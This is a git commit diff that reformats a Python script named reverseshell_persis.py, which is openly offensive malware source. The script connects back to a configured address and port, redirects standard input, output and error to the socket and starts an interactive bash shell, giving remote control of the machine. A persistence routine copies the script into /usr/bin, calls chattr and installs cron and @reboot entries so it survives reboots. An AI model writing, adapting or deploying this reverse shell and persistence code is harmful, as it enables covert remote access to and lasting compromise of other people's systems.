733cdd00ec7bcbd09de8752442f279bb22dc3402
Keyjeek <88333825+Keyj33k@users.noreply.github.com>
2022-05-16 23:24:56 +0200

    Update reverseshell_persis.py

--- reverseshell_persis.py
+++ reverseshell_persis.py
@@ -16,18 +16,35 @@ import os
 def __persistence():
     import time
     os.system('sudo cp reverseshell.py /usr/bin') # copy the reverseshell to /usr/bin
-    run(f'sudo chattr -i /usr/bin/reverseshell.py', shell=True) # make the script unmodifiable in /usr/bin
-    run(f'echo "30 18 * * * /usr/bin/reverseshell.py" | crontab -e', shell=True) # add a cronjob for this file
-    run(f'echo "@reboot /usr/bin/reverseshell.py" | tee -a /etc/crontab', shell=True) # add reverseshell.py to startup
+    run(
+        f'sudo chattr -i /usr/bin/reverseshell.py', 
+        shell=True
+    ) # make the script unmodifiable in /usr/bin
+    run(
+        f'echo "30 18 * * * /usr/bin/reverseshell.py" | crontab -e', 
+        shell=True
+    ) # add a cronjob for this file
+    run(
+        f'echo "@reboot /usr/bin/reverseshell.py" | tee -a /etc/crontab', 
+        shell=True
+    ) # add reverseshell.py to startup
     time.sleep(0.25)
 
 class shell:
     
-    def __init__(self, target_address, target_port): # assign the target address and the target port
+    def __init__(
+        self, 
+        target_address, 
+        target_port
+    ): # assign the target address and the target port
         self.target_address = target_address
         self.target_port    = target_port
         
-reverse_connection          = shell("127.0.0.1", int(5003)) # define target ip address and target port
+reverse_connection          = shell(
+    "127.0.0.1", int(
+        5003
+    )
+) # define target ip address and target port
 
 if __name__ == "__main__":
     os.system('clear')
@@ -37,17 +54,35 @@ if __name__ == "__main__":
     os.system('clear')
 
     # Change socket.SOCK_STREAM(TCP) to socket.SOCK_DRAM for UDP connection
-    socket_sock = socket.socket(socket.AF_INET, 
-                            socket.SOCK_STREAM) # use ipv4(AF_INET) and tcp(SOCK_STREAM) for the connection
-    socket_sock.connect((reverse_connection.target_address, 
-                            reverse_connection.target_port)) # start a connection to the target
+    socket_sock = socket.socket(
+        socket.AF_INET, 
+        socket.SOCK_STREAM
+    ) # use ipv4(AF_INET) and tcp(SOCK_STREAM) for the connection
+    socket_sock.connect((
+        reverse_connection.target_address, 
+        reverse_connection.target_port
+    )) # start a connection to the target
 
-    dup2(socket_sock.fileno(), 0) # return stream integer file descriptor
-    dup2(socket_sock.fileno(), 1) # used for request I/O actions from the OS
-    dup2(socket_sock.fileno(), 2)
+    dup2(
+        socket_sock.fileno(), 
+        0
+    ) # return stream integer file descriptor
+    dup2(
+        socket_sock.fileno(), 
+        1
+    ) # used for request I/O actions from the OS
+    dup2(
+        socket_sock.fileno(), 
+        2
+    )
     
     # if you have any issues, try: comment line 51 out and uncommend line 52
-    run(["/bin/bash", "-i"]) # finally run the bash console
+    run(
+        [
+            "/bin/bash", 
+            "-i"
+        ]
+    ) # finally run the bash console
     # run(["/bin/bash"], shell=True)
 
 
